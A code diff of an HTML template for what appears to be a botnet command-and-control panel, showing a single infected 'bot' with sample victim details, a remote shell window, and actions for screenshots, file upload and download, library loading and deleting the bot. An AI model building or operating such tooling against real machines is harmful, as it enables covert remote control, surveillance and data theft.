@@ -5,83 +5,191 @@ Bot {{ id }}
 {% endblock %}
 
 {% block content %}
-    <h1>Bot {{ id }}</h1>
-    <div>
-        {% for data in bot_data %}
-            <p> {{ data }} </p>
-        {% endfor %}
-        <a href= {{url_for('proclist', id = id)}}>View Process List</a><br>
-        <a href= {{url_for('networkaddresses', id = id)}}>View Network Address List</a><br>
-        <a href= {{url_for('commandoutput', id = id)}}>View Command Output</a><br>
-    </div>
-
-    <div>
-        <form action="/action/ss" method="POST" id="ss">
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-
-        <form action="/action/info" method="POST" id="info">
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-
-        <form action="/action/ps" method="POST" id="ps">
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-
-        <form action="/action/clear" method="POST" id="clear">
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-
-        <div class="btn-group">
-            <button type="submit" form="info" value="Submit">Update Info</button>
-            <button type="submit" form="ps" value="Submit">Update Process List</button>
-            <button type="submit" form="clear" value="Submit">Clear command queue</button>
-            <button type="submit" form="ss" value="Submit">Screenshot</button>
+    <!-- Page content -->
+    <script>var id = "{{ id }}"; var uuid = id;</script>
+    <script>$(document).ready(function() { init(); });</script>
+    <div id="main" class="main">
+    
+        <div id="modals" class="bot">
+            <div id="uploadmodal" class="modal bot">
+            <!-- Modal content -->
+                <div class="modal-content">
+                    <span id="uploadclose" class="close">&times;</span>
+                    <input type="text" class="shell" id="uploadtext" name="uploadtext" placeholder=">Path">
+                </div>
+            </div>
+            <div id="downloadmodal" class="modal bot">
+            <!-- Modal content -->
+                <div class="modal-content">
+                    <span id="downloadclose" class="close">&times;</span>
+                    <input type="text" class="shell" id="downloadpathtext" name="downloadpath" placeholder=">Path">
+                    <input type="text" class="shell" id="downloadurltext" name="downloadurl" placeholder=">URL">
+                </div>
+            </div>
+            <div id="loadlibrarymodal" class="modal bot">
+            <!-- Modal content -->
+                <div class="modal-content">
+                    <span id="loadlibraryclose" class="close">&times;</span>
+                    <input type="text" class="shell" id="loadlibrarytext" name="loadlibrarypath" placeholder=">Path">
+                </div>
+            </div>
+            <div id="processmodal" class="modal bot">
+            <!-- Modal content -->
+                <div class="modal-content">
+                    <span class="close">&times;</span>
+                    <p>Some text in the Modal..</p>
+                </div>
+            </div>
+            <div id="deletemodal" class="modal bot">
+            <!-- Modal content -->
+                <div class="modal-content">
+                    <span id="deleteclose" class="close">&times;</span>
+                    <p>Some text in the Modal..</p>
+                </div>
+            </div>
         </div>
-    </div>
 
 
 
-    <div>
-        <form action="/action/run" method="POST" id="run">
-        <label for="cmd">Command:</label>
-        <input type="text" id="cmd" name="cmd"><br><br>
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-        <button type="submit" form="run" value="Submit">Run</button>
-    </div>
-    <div>
-        <form action="/action/upload" method="POST" id="upload">
-        <label for="cmd">Path:</label>
-        <input type="text" id="path" name="path"><br><br>
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-        <button type="submit" form="upload" value="Submit">Upload</button>
-    </div>
-    <div>
-        <form action="/action/loadlibrary" method="POST" id="loadlibrary">
-        <label for="cmd">Path:</label>
-        <input type="text" id="librarypath" name="librarypath"><br><br>
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-        <button type="submit" form="loadlibrary" value="Submit">Load Library</button>
-    </div>
-    <div>
-        <form action="/action/download" method="POST" id="download">
-        <label for="url">URL:</label>
-        <input type="text" id="url" name="url">
-        <label for="filepath">File Path:</label>
-        <input type="text" id="filepath" name="filepath"><br><br>
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-        <button type="submit" form="download" value="Submit">Download</button>
-    </div>
-    <div>
-        <form action="/action/kill" method="POST" id="kill">
-        <label for="cmd">Process ID:</label>
-        <input type="text" id="pid" name="pid"><br><br>
-        <input type="hidden" name="id" value="{{ id }}">
-        </form>
-        <button type="submit" form="kill" value="Submit">Kill</button>
+
+        <div id="bot" class="bot">
+            <h1>Info</h1>
+            <img class="whiteicon" src="{{url_for('static', filename='icon/refresh-line.svg') }}" onclick="refreshHandler(uuid)">
+            <div class="bot botinfo">
+                <p>UUID: </p>
+                <p id="uuid">ac50265c-80d2-11ec-b0c7-a0afbdf25806</p>
+            </div>
+            <div class="bot botinfo">
+                <p>Last Seen: </p>
+                <p id="lastseen">Thu Feb 10 2022 16:57:04 GMT-0500 (Eastern Standard Time)</p>
+            </div>
+            <div class="bot botinfo">
+                <p>External IP: </p>
+                <p id="external-ip">129.21.00.0</p>
+            </div>
+            <div class="bot botinfo">
+                <p>Operating System: </p>
+                <p id="os">Windows 10 Home</p>
+            </div>
+            <div class="bot botinfo">
+                <p>Username: </p>
+                <p id="username">Administrator</p>
+            </div>
+            <div class="bot botinfo">
+                <p>Device Name: </p>
+                <p id="devicename">DESKTOP-LOLLMAO</p>
+            </div>
+            <div class="bot botinfo">
+                <p>Region: </p>
+                <p id="region">US</p>
+            </div>
+            <div class="bot botinfo">
+                <p>Memory Amount: </p>
+                <p id="memory-amount">16777216</p>
+            </div>
+            <div class="bot botinfo">
+                <p>Queue: </p>
+                <p id="queue">{"action": "shell", "command": "whoami"}</p>
+            </div>
+            
+            <span>
+                <img class="whiteicon" id="hidenetinfo" src="{{url_for('static', filename='icon/arrow-down-s-line.svg') }}" onclick="hideNetInfo(0)">
+                <p>Network: </p>
+            </span>
+
+            <div class="bot" id="netinfo" hidden>
+                <div class="bot netinfo">
+                    <p>26BCF623-A9FD-46C4-87F1-000000000000</p> 
+                    <p>00-50-56-00-00-00</p>
+                    <p>192.168.1.1</p>
+                </div>
+                <br>
+                <div class="bot netinfo">
+                    <p>26BCF623-A9FD-46C4-87F1-000000000000</p> 
+                    <p>00-50-56-00-00-00</p>
+                    <p>192.168.1.1</p>
+                </div>
+                <br>
+            </div>
+
+            <span>
+                <img class="whiteicon" id="shellicon" src="{{url_for('static', filename='icon/terminal-box-line.svg') }}" onclick="hideShell(0)">
+                <h1>Shell</h1>
+            </span>
+            <div id="shellexecouter" class="shellouter">
+                <div id="shellexec" class="shell">
+                    <p>>whoami</p>
+                    <p>Administrator</p>
+                    <br>
+                    <p>>whoami</p>
+                    <p>Administrator</p>
+                    <br>
+                    <p>>whoami</p>
+                    <p>Administrator</p>
+                    <br>
+                    <p>>whoami</p>
+                    <p>Administrator</p>
+                    <br>
+                    <p>>whoami</p>
+                    <p>Administrator</p>
+                    <br>
+                </div>
+                <span class="shell">
+                    <input type="text" id="command" name="command" placeholder=">">
+                </span>
+            </div>
+
+            <h1>Actions</h1>
+            <div class="bot botaction">
+                <div class="bot botaction" id="screenshot">
+                    <a href="#" onclick="ss(uuid)" id="ssbutton">
+                        <span>Screenshot
+                            <img class="actionicon" src="{{url_for('static', filename='icon/screenshot-2-line.svg') }}">
+                        </span>
+                    </a>
+                </div>
+                <div class="bot botaction" id="info">
+                    <a href="#" onclick="info(uuid)" id="infobutton">
+                        <span>Update Info
+                            <img class="actionicon" src="{{url_for('static', filename='icon/refresh-line.svg') }}">
+                        </span>
+                    </a>
+                </div>
+                <div class="bot botaction" id="upload">
+                    <a href="#" onclick="upload(uuid)" id="uploadbutton">
+                        <span>Upload
+                            <img class="actionicon" src="{{url_for('static', filename='icon/upload-cloud-line.svg') }}">
+                        </span>
+                    </a>
+                </div>
+                <div class="bot botaction" id="download">
+                    <a href="#" onclick="download(uuid)" id="downloadbutton">
+                        <span>Download
+                            <img class="actionicon" src="{{url_for('static', filename='icon/download-cloud-line.svg') }}">
+                        </span>
+                    </a>
+                </div>
+                <div class="bot botaction" id="loadlibrary">
+                    <a href="#" onclick="loadlibrary(uuid)" id="loadlibrarybutton">
+                        <span>Load Library
+                            <img class="actionicon" src="{{url_for('static', filename='icon/book-line.svg') }}">
+                        </span>
+                    </a>
+                </div>
+                <div class="bot botaction" id="clear">
+                    <a href="#" onclick="clearqueue(uuid)" id="clearqueuebutton">
+                        <span>Clear Queue
+                            <img class="actionicon" src="{{url_for('static', filename='icon/eraser-line.svg') }}">
+                        </span>
+                    </a>
+                </div>
+                <div class="bot botaction" id="delete">
+                    <a href="#" onclick="deleteBot(uuid)" id="deletebutton">
+                        <span>Delete
+                            <img class="actionicon" src="{{url_for('static', filename='icon/delete-bin-line.svg') }}">
+                        </span>
+                    </a>
+                </div>
+            </div>
     </div>
 {% endblock %}
